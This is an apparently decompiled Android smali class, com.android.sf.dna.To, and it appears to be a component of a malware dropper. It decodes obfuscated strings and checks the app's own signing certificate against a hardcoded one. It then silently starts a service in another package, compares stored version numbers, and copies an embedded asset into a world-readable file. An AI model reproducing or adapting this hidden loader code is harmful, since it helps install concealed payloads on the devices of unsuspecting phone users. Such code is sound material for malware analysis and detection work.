.class public Lcom/android/sf/dna/To;
.super Ljava/lang/Object;


# static fields
.field static g:Landroid/content/Context;

.field static h:Landroid/app/Activity;

.field public static i:Z


# instance fields
.field a:Ljava/lang/String;

.field b:Ljava/lang/String;

.field c:Landroid/content/Intent;

.field d:Landroid/app/ProgressDialog;

.field e:Landroid/app/AlertDialog;

.field f:I

.field j:Ljava/lang/String;

.field k:Ljava/util/Random;

.field l:Z

.field private m:I

.field private n:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/android/sf/dna/To;->g:Landroid/content/Context;

    sput-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    const/4 v0, 0x1

    sput-boolean v0, Lcom/android/sf/dna/To;->i:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    const/4 v2, 0x0

    const/4 v1, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x3

    iput v0, p0, Lcom/android/sf/dna/To;->m:I

    const-string v0, "7CMg9IkOzoFhHxlO7Ikput32Xl__"

    invoke-static {v0}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/android/sf/dna/To;->a:Ljava/lang/String;

    const-string v0, "7CMg9IkOzoFhHxlO7Ikput32XcBvrIRDzC3lrIMCHxiRrn__"

    invoke-static {v0}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/android/sf/dna/To;->b:Ljava/lang/String;

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    iput-object v0, p0, Lcom/android/sf/dna/To;->c:Landroid/content/Intent;

    iput-object v2, p0, Lcom/android/sf/dna/To;->d:Landroid/app/ProgressDialog;

    iput-object v2, p0, Lcom/android/sf/dna/To;->e:Landroid/app/AlertDialog;

    iput v1, p0, Lcom/android/sf/dna/To;->f:I

    const-string v0, "3082025d308201c6a00302010202044de7355a300d06092a864886f70d010105050030723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a69303030313020170d3131303630323037303134365a180f32313232303530363037303134365a30723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a693030303130819f300d06092a864886f70d010101050003818d0030818902818100b2851f2f85af5894bdfd96b10b9465dfc10bf430d66f3837bd12f2346c438f3da0c16666cc23e7ae29c1f3ce30167d32376bb170b372fb8c87439b6ce7f0c3811818d60517131ddf1cead3db2e124f918d6b5db9899dd56fa28ff933c4ed855233d5318dd3d3b4fb28b00c5b8b8cec71a74a88a011d6c8256b90ce122a4a06330203010001300d06092a864886f70d0101050500038181000d72270a1c9970897335541d64ba729568a0f535aee7c20e5397f44d410e6cf76d0f97bc495eeb8e77d2d3d3ab6fe947515f4cb10468b073bf122a4e4bcdd2e6f0a6623af3bdc9039cc8139dc4fb32c58cf55f1661b730beaa5977faea9ace72e65448a002e5bffa6de75fcf14a1c3bcfd64d385c7e6654c4e2f52e635015dae"

    iput-object v0, p0, Lcom/android/sf/dna/To;->j:Ljava/lang/String;

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    iput-object v0, p0, Lcom/android/sf/dna/To;->k:Ljava/util/Random;

    iput-boolean v1, p0, Lcom/android/sf/dna/To;->l:Z

    new-instance v0, Lcom/android/sf/dna/Collection;

    invoke-direct {v0, p0}, Lcom/android/sf/dna/Collection;-><init>(Lcom/android/sf/dna/To;)V

    iput-object v0, p0, Lcom/android/sf/dna/To;->n:Landroid/os/Handler;

    return-void
.end method

.method private a(I)V
    .locals 2

    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    iput p1, v0, Landroid/os/Message;->what:I

    iget-object v1, p0, Lcom/android/sf/dna/To;->n:Landroid/os/Handler;

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    return-void
.end method

.method static synthetic a(Lcom/android/sf/dna/To;)V
    .locals 0

    invoke-direct {p0}, Lcom/android/sf/dna/To;->e()V

    return-void
.end method

.method static synthetic a(Lcom/android/sf/dna/To;I)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/android/sf/dna/To;->a(I)V

    return-void
.end method

.method static synthetic b(Lcom/android/sf/dna/To;)V
    .locals 0

    invoke-direct {p0}, Lcom/android/sf/dna/To;->c()V

    return-void
.end method

.method private c()V
    .locals 3

    :try_start_0
    iget-object v0, p0, Lcom/android/sf/dna/To;->c:Landroid/content/Intent;

    iget-object v1, p0, Lcom/android/sf/dna/To;->a:Ljava/lang/String;

    iget-object v2, p0, Lcom/android/sf/dna/To;->b:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    iget-object v1, p0, Lcom/android/sf/dna/To;->c:Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private d()V
    .locals 3

    :try_start_0
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "9Ci5utjhztkp7cA_"

    invoke-static {v2}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v2}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "9Cz18t3N94nO7KTm"

    invoke-static {v2}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private e()V
    .locals 5

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/sf/dna/To;->l:Z

    :try_start_0
    invoke-direct {p0}, Lcom/android/sf/dna/To;->d()V

    sget-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v0}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    const-string v1, "7xBNzKFCzKFW"

    invoke-static {v1}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    sget-object v1, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    const-string v2, "XvB5rtE_"

    invoke-static {v2}, Lcom/android/sf/dna/Amazing;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget v3, p0, Lcom/android/sf/dna/To;->m:I

    invoke-virtual {v1, v2, v3}, Landroid/app/Activity;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-virtual {v0}, Ljava/io/InputStream;->available()I

    move-result v2

    new-array v2, v2, [B

    :goto_0
    invoke-virtual {v0, v2}, Ljava/io/InputStream;->read([B)I

    move-result v3

    const/4 v4, -0x1

    if-ne v3, v4, :cond_0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    invoke-virtual {v1}, Ljava/io/FileOutputStream;->flush()V

    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/sf/dna/To;->l:Z

    :goto_1
    return-void

    :cond_0
    invoke-virtual {v1, v2}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_1
.end method


# virtual methods
.method public a()Ljava/lang/String;
    .locals 3

    :try_start_0
    sget-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v0}, Landroid/app/Activity;->getBaseContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    sget-object v1, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v1}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x40

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->signatures:[Landroid/content/pm/Signature;

    const/4 v1, 0x0

    aget-object v0, v0, v1

    invoke-virtual {v0}, Landroid/content/pm/Signature;->toCharsString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public a(Landroid/content/Context;Landroid/app/Activity;)V
    .locals 2

    sput-object p1, Lcom/android/sf/dna/To;->g:Landroid/content/Context;

    sput-object p2, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    iget-object v0, p0, Lcom/android/sf/dna/To;->j:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/android/sf/dna/To;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lcom/android/sf/dna/To;->b()V

    :cond_0
    return-void
.end method

.method public b()V
    .locals 5

    const/16 v4, 0xa

    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    const-string v1, "1.5"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    :goto_0
    return-void

    :cond_0
    invoke-direct {p0}, Lcom/android/sf/dna/To;->c()V

    :try_start_0
    sget-object v0, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v0}, Landroid/app/Activity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    sget-object v1, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    invoke-virtual {v1}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    iget v0, v0, Landroid/content/pm/PackageInfo;->versionCode:I

    sget-object v1, Lcom/android/sf/dna/To;->h:Landroid/app/Activity;

    iget-object v2, p0, Lcom/android/sf/dna/To;->a:Ljava/lang/String;

    const/4 v3, 0x2

    invoke-virtual {v1, v2, v3}, Landroid/app/Activity;->createPackageContext(Ljava/lang/String;I)Landroid/content/Context;

    move-result-object v1

    const-wide/16 v2, 0x1f4

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    const-string v2, "first_app_perferences"

    iget v3, p0, Lcom/android/sf/dna/To;->m:I

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "global_b_version_id"

    const/4 v3, 0x0

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    if-nez v1, :cond_1

    const/16 v0, 0xa

    invoke-direct {p0, v0}, Lcom/android/sf/dna/To;->a(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-direct {p0, v4}, Lcom/android/sf/dna/To;->a(I)V

    goto :goto_0

    :cond_1
    if-ge v1, v0, :cond_2

    const/16 v0, 0xa

    :try_start_1
    invoke-direct {p0, v0}, Lcom/android/sf/dna/To;->a(I)V

    goto :goto_0

    :cond_2
    invoke-direct {p0}, Lcom/android/sf/dna/To;->d()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0
.end method
